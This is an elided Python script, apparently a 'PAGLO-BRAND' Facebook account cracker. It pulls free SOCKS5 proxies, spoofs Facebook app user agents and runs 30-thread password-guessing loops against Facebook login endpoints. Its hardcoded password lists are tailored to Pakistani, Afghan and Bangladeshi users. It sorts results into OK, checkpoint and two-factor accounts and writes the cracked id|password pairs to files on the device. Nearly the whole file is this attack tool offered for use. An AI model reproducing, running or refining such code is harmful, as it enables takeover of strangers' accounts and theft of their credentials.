...
try:
	...
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text	open('.prox.txt','w').write(prox)
...
PAGLO2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/104.0.5112.71 Mobile/15E148 Safari/604.1",

"Mozilla/5.0 (iPad; CPU OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/104.0.5112.71 Mobile/15E148 Safari/604.1",

"Mozilla/5.0 (iPod; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/104.0.5112.71 Mobile/15E148 Safari/604.1",
...
def ua_krek():
		...
		ua = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(9,13))}; Vision3 Build/MRA58K) [FBAN/MessengerLite;FBAV/{str(rr(40,375))}.309.0.0.8.61;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/434647565;FBCR/PAGLOS;FBMF/Vision;FBBD/Vision;FBDV/Vision3;FBSV/{str(rr(9,13))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.54375,width=720,height=1600};]")
...
try:
	...
	print(f" {H2}â€¢{P2} koneksi internet anda bermasalah")
...
logo ="""  _____        _____ _      ____  
 ...
 |_| /_/    \_\_____|______\____/ 

\33[1;37m----------------------------------------------

â†’   Owner      :  PAGLO-BRAND

â†’   Facebook   :  PAGLO-BRAND

â†’   Github     :  ðŸ‘€ðŸŒšbana ni
	  ...
	  #  show(' Use flight mode before using starting crack')
		...
		for user in fo:
			...
			if opt_method =='1':
				...
				crack_submit.submit(mmm,ids,names,passlist,total_ids)
								...
								with tred(max_workers=30) as crack_submit:
										...
										for user in fo:
												...
												if mthd in ['1','01']:
														...
														crack_submit.submit(fff,ids,names,passlist)
...
def pak():
				...
				with tred(max_workers=30) as PAGLO:	 
						...
						for psx in user:
								...
								pwx = [psx,uid,'khankhan','khan1122','khan123456','khan786','khan123','ali12345','malik786','malik1234','swat123','swat1122','ali786']

								PAGLO.submit(PAGLO3,uid,pwx,tl)
...
def afg():
				...
				print('\033[1;31m Code example: 72,77,74,76,73,')
				...
				with tred(max_workers=30) as PAGLO:	 
						...
						for psx in user:
								...
								pwx = [psx,ids,'afghan','afghan12345','afghan123','600','700','afghan12','afghanafghan','200']
...
def pak1():
				...
				with tred(max_workers=30) as PAGLO:	 
						...
						for psx in user:
								...
								PAGLO.submit(mbasic,uid,pwx,tl)
...
def bd():
				...
				with tred(max_workers=30) as PAGLO:	 
						...
						for psx in user:
								...
								pwx = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
...
def gmail():
				...
				with tred(max_workers=30) as PAGLO:
						...
						for user in fo:
								...
								PAGLO.submit(PAGLO2,ids,passlist)
...
def ffb(ids,names,passlist):
		...
		sys.stdout.write('\r\r\033[1;37m [PAGLO-NEW] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		...
		try:
				...
				for fikr in passlist:
						...
						PAGLO=session.cookies.get_dict().keys()
						...
						if "c_user" in PAGLO:
								...
								print('\r\r\033[1;32m [PAGLO-OK] %s | %s'%(ids,pas))

								open('/sdcard/PAGLO-OK.txt', 'a').write(ids+'|'+pas+'\n')

								oks.append(ids)

								break

						elif 'checkpoint' in PAGLO:

								if 'y' in pcp:

										print('\r\r\x1b[1;93m [PAGLO-CP] '+ids+' | '+pas+'\033[1;97m')

										open('/sdcard/PAGLO-CP.txt', 'a').write(ids+'|'+pas+'\n')
...
def mbasic(uid,pwx,tl):
	...
	try:
		...
		for ps in pwx:
			...
			sys.stdout.write(f'\r\033[1;37m[PAGLO] %s|\033[1;32mOK:-%s \33[1;97m'%(loop,len(ok))), 
			...
			free_fb = session.get(f'https://p.facebook.com/login/?email={uid}&li=3-QvYyUu6bJmwesTNF_kYM7K&e=1348131&shbl=1&refsrc=deprecated&_rdr').text
			...
			if 'c_user' in log_cookies:
				...
				if "checkpoint" in str(lo):
					...
					print('\r\033[1;36m[PAGLO-TL] '+uid+' | '+ps)

				else:

					print('\r\033[1;32m[PAGLO-OK] '+uid+' | '+ps)

					open('/sdcard/PAGLO-OK.txt', 'a').write(uid+' | '+ps+'\n')
				...
				if 'Enter login code to continue' in str(lo):

					coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

					cid=coki[141:156]

					print('\r\033[1;34m[PAGLO-2F] '+uid+' | '+ps)

					open('/sdcard/AKINH-2F.txt', 'a').write(uid+' | '+ps+'\n')
					...
					print(f'\r\x1b[38;5;208m[PAGLO-CP] '+uid+' | '+ps)

					open('/sdcard/PAGLO-CP.txt', 'a').write(uid+' | '+ps+'\n')
...
def PAGLO3(uid,pwx,tl):
	...
	try:
		...
		for ps in pwx:
			...
			sys.stdout.write(f'\r [\033[1;97mPAGLO-RANDOM\033[1;97m] [%s] OK:-%s \r'%(loop,len(oks))),
			...
			if 'c_user' in log_cookies:
				...
				print('\033[1;92m  [PAGLO-Ok] '+uid+' | '+ps+'\033[1;32m')
				...
				print('\33[1;34m  [PAGLO-CP] '+uid+' | '+ps+'\33[0;97m')
...
def PAGLO1(ids,passlist):
		...
		sys.stdout.write('\r\r\033[1;37m[PAGLO] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		...
		try:
				...
				for pas in passlist:
						...
						ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.0; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=1.5,width=800,height=480};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
						...
						if 'session_key' in po:
								...
								if str(uid) in oks:
										...
										print('\r\r\033[1;32m[PAGLO-OK] '+str(uid)+' | '+pas+'\033[1;97m')

										open('/sdcard/PAGLO/OK.txt','a').write(str(uid)+'|'+pas+'\n')
								...
								if uid in oks:pass
										...
										print('\r\r\x1b[1;93m[PAGLO-CP] '+str(uid)+' | '+pas+'\033[1;97m')

										open('/sdcard/PAGLO/CP.txt','a').write(str(uid)+'|'+pas+'\n')
...
def PAGLO2(ids,passlist):
		...
		sys.stdout.write('\r\r\033[1;37m[PAGLO-AJ] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
...
def main():
		...
		print('[3] Make File From Old File')

		print('[4] Cut Use Links From File')

		print('[5] Sep Links From File')

		print('[6] Remove Double Links From File')

		print('[7] Clear Cache')

		print('[0] Exit \033[38;5;208m')
...
def method1(ids,names,passlist,total_ids):
	...
	try:
		...
		for fikr in passlist:
			...
			ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=1.5,width=800,height=480};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
			...
			po = requests.post(url,data=data,headers=headers,proxies=proxs).json()

			if 'access_token' in po:

				print('\033[1;32m  '+ids+' [PAGLO-OK] '+pas+'\033[0;97m')
				...
				print('\033[1;35m  '+ids+' [PAGLO-2F] '+pas+'\033[0;97m')

				tf.append(ids)

				open('/sdcard/PAGLO/2F.txt','a').write(ids+' | '+pas+'\n')

				break

			elif 'temporarily unavailable' in str(po):

				print('\033[1;93m  '+ids+' [PAGLO-CP] '+pas+'\033[0;97m')
